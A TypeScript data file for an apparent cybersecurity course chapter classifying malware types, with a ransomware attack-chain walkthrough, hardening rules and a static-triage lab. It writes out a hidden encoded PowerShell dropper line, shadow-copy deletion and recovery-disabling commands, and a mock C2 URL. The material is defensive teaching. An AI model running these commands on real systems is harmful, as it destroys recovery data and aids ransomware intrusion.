import type { Chapter } from '../types';

export const chapter03: Chapter = {
  "id": "chapter-03",
  "number": 3,
  "romanNumeral": "III",
  "title": "Malware Classifications and Types",
  "subtitle": "Viruses, Worms, Trojans, Ransomware, and Spyware Behaviors",
  "category": "Threats & Attacks",
  "readTime": "6 min read",
  "summary": "Examines the distinct classification mechanisms, propagation behaviors, and payloads of major malware types.",
  "introParagraphs": [
    "Malware is software created to damage systems, steal information, or perform unauthorized activities.",
    "While laypeople often describe all digital infections as 'viruses', computer scientists classify malicious software by how it attaches, replicates, deceives, and monetizes its victims."
  ],
  "topics": [
    {
      "id": "topic-3-1",
      "number": "3.1",
      "title": "Introduction to Malware",
      "content": [
        "Malware is software created to damage systems, steal information, or perform unauthorized activities.",
        "Modern malware can operate at various layers of the operating system, from userland executable files down to the kernel and UEFI firmware."
      ],
      "definitions": [
        {
          "term": "Malware",
          "definition": "Software created to damage systems, steal information, or perform unauthorized activities.",
          "keyTakeaway": "Broad umbrella category for all adversarial computer code."
        }
      ]
    },
    {
      "id": "topic-3-2",
      "number": "3.2",
      "title": "Computer Virus",
      "content": [
        "A Virus is malware that attaches itself to a legitimate file or program and spreads when the infected file is executed by a human user or process.",
        "Just like a biological virus, it cannot replicate independently without attaching to a host carrier program."
      ],
      "definitions": [
        {
          "term": "Virus",
          "definition": "A malware program that attaches itself to a file or program and spreads when the infected file is executed.",
          "keyTakeaway": "Virus \u2192 Attaches to another file or program."
        }
      ],
      "examples": [
        {
          "title": "Macro and File Infector Viruses",
          "scenario": "An attacker embeds a malicious macro virus into an office document invoice.docm.",
          "breakdown": [
            {
              "label": "Host Attachment",
              "detail": "The viral payload stays dormant within document macros."
            },
            {
              "label": "Execution Trigger",
              "detail": "The victim opens the document and clicks 'Enable Content'."
            },
            {
              "label": "Infection Spread",
              "detail": "The virus infects all other document templates in the system."
            }
          ]
        }
      ],
      "keyPoints": [
        "Requires human execution of the infected host program to propagate.",
        "Alters existing executable files or startup sectors."
      ]
    },
    {
      "id": "topic-3-3",
      "number": "3.3",
      "title": "Network Worm",
      "content": [
        "A Worm is malware that can spread from one computer to another without requiring a user to run an infected file.",
        "Worms exploit software network vulnerabilities directly to replicate and transmit copies of themselves autonomously across networks."
      ],
      "definitions": [
        {
          "term": "Worm",
          "definition": "Malware that can spread from one computer to another autonomously without requiring a user to run an infected file.",
          "keyTakeaway": "Worm \u2192 Spreads automatically between systems."
        }
      ],
      "examples": [
        {
          "title": "Autonomous Network Replication",
          "scenario": "A vulnerable SMB port is exposed to the local network:",
          "breakdown": [
            {
              "label": "Network Scan",
              "detail": "Worm scans subnet IP ranges for open listening ports."
            },
            {
              "label": "Exploitation",
              "detail": "Sends malformed packets triggering buffer overflow."
            },
            {
              "label": "Self-Replication",
              "detail": "Transfers payload and executes without any user login or file click."
            }
          ]
        }
      ],
      "keyPoints": [
        "Does NOT require a host file or human intervention.",
        "Consumes massive network bandwidth through exponential replication."
      ]
    },
    {
      "id": "topic-3-4",
      "number": "3.4",
      "title": "Trojan Horse",
      "content": [
        "A Trojan is malicious software that appears to be a legitimate, benign, or useful program.",
        "Named after the Greek legend of the Trojan Horse, it tricks the victim into voluntary installation by masking its malicious interior."
      ],
      "definitions": [
        {
          "term": "Trojan",
          "definition": "Malicious software that appears to be a legitimate or useful program while concealing malicious behavior.",
          "keyTakeaway": "Trojan \u2192 Looks legitimate but performs malicious actions."
        }
      ],
      "examples": [
        {
          "title": "Fake Utility or Game Crack",
          "scenario": "A user downloads what appears to be a legitimate PDF reader or game patch:",
          "breakdown": [
            {
              "label": "Deceptive Exterior",
              "detail": "The program presents a functional installer interface."
            },
            {
              "label": "Covert Action",
              "detail": "In the background, it silently installs a remote access trojan (RAT)."
            },
            {
              "label": "Backdoor Access",
              "detail": "The attacker opens a covert reverse shell back to their command server."
            }
          ]
        }
      ],
      "keyPoints": [
        "Relies heavily on social engineering and deceptive appearances.",
        "Does not typically self-replicate like a worm."
      ]
    },
    {
      "id": "topic-3-5",
      "number": "3.5",
      "title": "Ransomware",
      "content": [
        "Ransomware is malware that prevents access to files or systems and demands payment from the victim.",
        "Most modern ransomware encrypts sensitive personal or corporate documents with military-grade asymmetric algorithms (RSA/AES) and demands cryptocurrency ransom."
      ],
      "definitions": [
        {
          "term": "Ransomware",
          "definition": "Malware that prevents access to files or entire systems, holding data hostage and demanding financial extortion.",
          "keyTakeaway": "Ransomware \u2192 Locks or encrypts data and demands payment."
        }
      ],
      "examples": [
        {
          "title": "Enterprise Cryptolocker Extortion",
          "scenario": "A corporate server is infected with ransomware:",
          "breakdown": [
            {
              "label": "Cryptographic Lock",
              "detail": "All database files and backups on attached shares are encrypted."
            },
            {
              "label": "Extortion Note",
              "detail": "A .txt file on the desktop demands $50,000 in Bitcoin within 72 hours."
            },
            {
              "label": "Recovery Strategy",
              "detail": "Organizations recover safely by restoring offline air-gapped immutable backups."
            }
          ]
        }
      ],
      "keyPoints": [
        "Targeted threats often exfiltrate data before encryption (double extortion).",
        "Air-gapped offline backups are the most reliable defense."
      ]
    },
    {
      "id": "topic-3-6",
      "number": "3.6",
      "title": "Spyware",
      "content": [
        "Spyware is malware that secretly collects information about a user or system and transmits it to unauthorized third parties.",
        "It monitors keystrokes (keyloggers), browser history, credentials, camera/microphone streams, and sensitive files."
      ],
      "definitions": [
        {
          "term": "Spyware",
          "definition": "Malware that secretly monitors and collects information about a user or system without authorization.",
          "keyTakeaway": "Spyware \u2192 Secretly collects information."
        }
      ],
      "tables": [
        {
          "title": "Malware Classification & Characteristics Matrix",
          "columns": [
            {
              "key": "type",
              "header": "Malware Type"
            },
            {
              "key": "action",
              "header": "Core Action"
            },
            {
              "key": "needsHost",
              "header": "Requires Host File?"
            },
            {
              "key": "humanAction",
              "header": "Requires User Action?"
            }
          ],
          "rows": [
            {
              "type": "Virus",
              "action": "Attaches & infects host programs",
              "needsHost": "Yes",
              "humanAction": "Yes (Run host)"
            },
            {
              "type": "Worm",
              "action": "Self-propagates via networks",
              "needsHost": "No",
              "humanAction": "No (Autonomous)"
            },
            {
              "type": "Trojan",
              "action": "Disguises as legitimate software",
              "needsHost": "No",
              "humanAction": "Yes (Install)"
            },
            {
              "type": "Ransomware",
              "action": "Encrypts files & demands ransom",
              "needsHost": "Variable",
              "humanAction": "Variable"
            },
            {
              "type": "Spyware",
              "action": "Secretly monitors & steals data",
              "needsHost": "Variable",
              "humanAction": "Variable"
            }
          ]
        }
      ],
      "keyPoints": [
        "Runs covertly in the background with minimal outward symptoms.",
        "Can capture banking logins, credit card numbers, and proprietary chat messages."
      ]
    }
  ],
  "quickRevision": [
    {
      "topic": "Virus",
      "summary": "Attaches to files or programs and spreads upon execution."
    },
    {
      "topic": "Worm",
      "summary": "Spreads automatically across networks without user action."
    },
    {
      "topic": "Trojan",
      "summary": "Pretends to be legitimate software to trick users into running it."
    },
    {
      "topic": "Ransomware",
      "summary": "Locks or encrypts data and demands ransom payment."
    },
    {
      "topic": "Spyware",
      "summary": "Secretly collects information, keystrokes, and credentials."
    }
  ],
  "rememberPoints": [
    "Virus \u2192 Attaches",
    "Worm \u2192 Spreads",
    "Trojan \u2192 Pretends",
    "Ransomware \u2192 Locks",
    "Spyware \u2192 Watches/Collects"
  ],
  "examQuestions": [
    {
      "question": "Differentiate between a Computer Virus and a Network Worm in terms of host dependence and propagation.",
      "answerGuidance": "A virus requires a host program/file and human execution to spread; a worm is a standalone program that exploits network vulnerabilities to replicate autonomously without user action."
    },
    {
      "question": "Explain the mechanism of a Trojan Horse and describe how social engineering enables its deployment.",
      "answerGuidance": "Explain how trojans disguise malicious backdoors inside seemingly legitimate utilities (cracks, cleaners, pdf readers), tricking the victim into executing the payload."
    }
  ],
  "attackVisualizations": [
      {
          "id": "attack-3-1",
          "title": "Ransomware Infection & Double-Extortion Lifecycle",
          "attackName": "Modern Ransomware Infection & Data Exfiltration Chain",
          "overview": "Adversaries gain initial access via spear-phishing or unpatched edge services, exfiltrate sensitive files, disable backups, and encrypt endpoints with hybrid cryptography.",
          "targetVulnerability": "Unrestricted script execution in user directories, lack of network microsegmentation, and accessible local backup snapshots.",
          "stages": [
              {
                  "step": 1,
                  "title": "Weaponized Delivery & Execution",
                  "actor": "Initial Access Broker",
                  "action": "Delivers malicious macro-enabled attachment or ISO image",
                  "technicalDetail": "Victim receives a spear-phishing email containing an invoice archive. Opening the payload spawns a stage-1 PowerShell dropper in %TEMP%.",
                  "color": "orange",
                  "payload": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0..."
              },
              {
                  "step": 2,
                  "title": "Command & Control (C2) Beaconing",
                  "actor": "Dropper Payload",
                  "action": "Establishes encrypted HTTPS tunnel to remote command server",
                  "technicalDetail": "The dropper checks for virtualization/sandboxes, disables Windows Defender via registry keys, and beacons out to an encrypted C2 IP address.",
                  "color": "red"
              },
              {
                  "step": 3,
                  "title": "Shadow Copy Deletion & Defense Evasion",
                  "actor": "Ransomware Binary",
                  "action": "Purges system recovery points and backup snapshots",
                  "technicalDetail": "Executes system commands to prevent local recovery: vssadmin delete shadows /all /quiet and bcdedit /set {default} recoveryenabled No.",
                  "color": "red"
              },
              {
                  "step": 4,
                  "title": "Data Exfiltration (Extortion Phase 1)",
                  "actor": "Threat Group",
                  "action": "Uploads sensitive databases and IP to Mega/S3 cloud buckets",
                  "technicalDetail": "Financial spreadsheets, credentials, and source code are compressed into password-protected RAR archives and exfiltrated over port 443.",
                  "color": "red"
              },
              {
                  "step": 5,
                  "title": "Hybrid Cryptographic Lockdown",
                  "actor": "Ransomware Core Engine",
                  "action": "Encrypts files with AES-256 and seals AES key with RSA-4096",
                  "technicalDetail": "Files are encrypted locally with high-speed AES-256-GCM. The AES key is encrypted with attacker's public RSA key. Extension changed to .locked.",
                  "color": "red"
              },
              {
                  "step": 6,
                  "title": "Zero-Trust Segmentation & Immutable Backups",
                  "actor": "Incident Response Architecture",
                  "action": "Isolates subnet, triggers EDR kill, restores from immutable store",
                  "technicalDetail": "Endpoint Detection and Response (EDR) identifies anomalous mass file-renaming IOPS and isolates the host. Air-gapped immutable S3 backups restore services without ransom payment.",
                  "color": "green"
              }
          ],
          "mitigation": {
              "title": "Comprehensive Anti-Ransomware Architecture",
              "rules": [
                  "Maintain the 3-2-1 backup rule with at least one offline, air-gapped immutable backup.",
                  "Deploy AppLocker or Windows Defender Application Control (WDAC) to block script execution in %TEMP% and %APPDATA%.",
                  "Implement behavioral EDR solutions with automated canary file tripwires.",
                  "Disable legacy SMBv1 protocols and require SMB packet signing."
              ]
          }
      }
  ],
  "beforeAfterComparisons": [
      {
          "title": "Script Execution Policy: Permissive Default vs. Strict Application Whitelisting",
          "vulnerable": {
              "label": "Vulnerable: Unrestricted User-Space Execution",
              "codeOrConfig": "# INSECURE: Default Windows environment allowing script execution\nSet-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Unrestricted\n# Users can execute unvetted scripts directly from %TEMP%:\nC:\\Users\\Victim\\AppData\\Local\\Temp\\invoice_update.vbs\nC:\\Users\\Victim\\Downloads\\stage1_loader.ps1",
              "explanation": "Malware delivered via email or browser downloads executes freely inside user directories without administrative elevation."
          },
          "secure": {
              "label": "Secure: AppLocker / WDAC Enforced Application Control",
              "codeOrConfig": "# SECURE: Software Restriction Policy blocking user-writable paths\n<RuleCollection Type=\"Script\" EnforcementMode=\"Enabled\">\n  <FilePathRule Action=\"Deny\" Path=\"%OSDIR%\\Temp\\*\" />\n  <FilePathRule Action=\"Deny\" Path=\"%USERPROFILE%\\AppData\\*\" />\n  <FilePublisherRule Action=\"Allow\" Publisher=\"O=MICROSOFT CORPORATION...\" />\n</RuleCollection>\nSet-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Restricted",
              "explanation": "Enforces strict cryptographic publisher whitelisting and denies execution in all writable user temp folders, stopping stage-1 droppers."
          },
          "keyTakeaway": "Preventing unauthorized binaries from executing in user-space cuts off over 80% of initial ransomware infections before payloads can unpack."
      }
  ],
  "handsOnPracticals": [
      {
          "id": "practical-3-1",
          "title": "Static Binary Triage & String Inspection in an Isolated Lab",
          "learningObjective": "Safely inspect compiled binary headers, calculate cryptographic signatures, and extract suspicious embedded URLs/commands without executing code.",
          "requiredTools": [
              "strings",
              "file",
              "sha256sum",
              "grep"
          ],
          "environmentSetup": "Isolated sandbox terminal (Linux or WSL).",
          "steps": [
              {
                  "stepNumber": 1,
                  "instruction": "Create a simulated benign binary with embedded reconnaissance strings to practice safe triage.",
                  "command": "python3 -c \"import sys; sys.stdout.buffer.write(b'\\x7fELF\\x02\\x01\\x01\\x00' + b'\\x00'*8 + b'http://c2-beacon.darknet.test/checkin\\x00vssadmin delete shadows /all\\x00')\" > sample.bin",
                  "commandExplanation": "Crafts a safe mock binary with an ELF header and embedded threat-simulation strings.",
                  "expectedOutput": "sample.bin written (approx 80 bytes)."
              },
              {
                  "stepNumber": 2,
                  "instruction": "Identify file type and architecture headers using the file command.",
                  "command": "file sample.bin",
                  "commandExplanation": "Reads the magic bytes without executing the binary to determine architecture and format.",
                  "expectedOutput": "sample.bin: ELF 64-bit LSB executable, version 1 (SYSV)"
              },
              {
                  "stepNumber": 3,
                  "instruction": "Extract readable ASCII and Unicode strings to uncover embedded domains and commands.",
                  "command": "strings sample.bin | grep -E \"(http|vssadmin|powershell)\"",
                  "commandExplanation": "Scans raw binary for null-terminated printable strings, filtering for indicators of compromise (IOCs).",
                  "expectedOutput": "http://c2-beacon.darknet.test/checkin\nvssadmin delete shadows /all"
              }
          ],
          "whatHappened": "Static triage revealed the simulated malware's C2 endpoint and shadow copy deletion command in under two seconds without executing a single instruction.",
          "securityLessons": [
              "Never double-click or run suspicious binaries to inspect them; always conduct static triage first.",
              "Strings inspection frequently uncovers hardcoded IP addresses, registry persistence keys, and obfuscation routines.",
              "Modern malware often packs or encrypts strings (UPX, custom crypters), requiring entropy analysis."
          ],
          "prevention": [
              "Conduct automated sandboxing (Cuckoo / Any.Run) in isolated virtual networks.",
              "Block newly observed domains (NOD) at the DNS resolver level.",
              "Quarantine email attachments with executable or script extensions (.iso, .vbs, .hta, .ps1, .exe)."
          ]
      }
  ]
};
